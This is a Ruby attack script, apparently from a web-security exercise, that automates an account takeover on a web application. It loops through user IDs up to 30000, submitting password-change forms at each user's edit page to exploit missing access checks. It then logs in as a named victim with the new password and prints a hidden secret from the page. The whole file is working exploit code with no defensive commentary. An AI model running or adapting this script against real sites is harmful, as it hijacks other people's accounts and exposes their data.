require_relative '../scripts'

class Scripts
  class BasicAuthVulnerability
    include Helper

    def crack
      # create_account

      agent.get '/sessions/new'

      user_id = 1
      if can_log_in
        get_secret
        return
      end

      while user_id <= 30000 do
        puts "Trying user_id #{user_id}"
        reset_password(user_id)

        if can_log_in
          get_secret
          break
        else
          user_id += 1
        end
      end
    end

    def create_account
      begin
        agent.get '/users/new'
        agent.page.forms.first.tap do |f|
          f['user[name]']                    = 'david@gmail.com'
          f['user[email]']                    = 'david@gmail.com'
          f.submit
        end

        agent.page.forms.first.tap do |f|
          f['user[password]']                    = '12345678'
          f.submit
        end
      rescue
      end

      agent.vist '/sessions/new'

      agent.page.forms.first.tap do |f|
        f['user[email]']                    = 'david@gmail.com'
        f['user[password]']                    = '12345678'
        f.submit
      end

    end

    def reset_password(user_id)
      agent.get "/users/#{user_id}/edit"

      agent.page.forms.first.tap do |f|
        f['user[password]']                  = '123456789'
        f.submit
      end
      print ' Y'
    rescue => e
      # raise 'Could not find user as out of IDs'
    end

    def can_log_in
      agent.get "/sessions/new"

      agent.page.forms.first.tap do |f|
        f['session[email]']                    = 'peter.parker@gmail.com'
        f['session[password]']                  = '123456789'
        f.submit
      end
      agent.page.body =~ /Hello/
    rescue => e
      puts e
      false
    end

    def get_secret
      puts Nokogiri.parse(agent.page.body).css('p.secret').text
    end
  end
end

Scripts::BasicAuthVulnerability.new.crack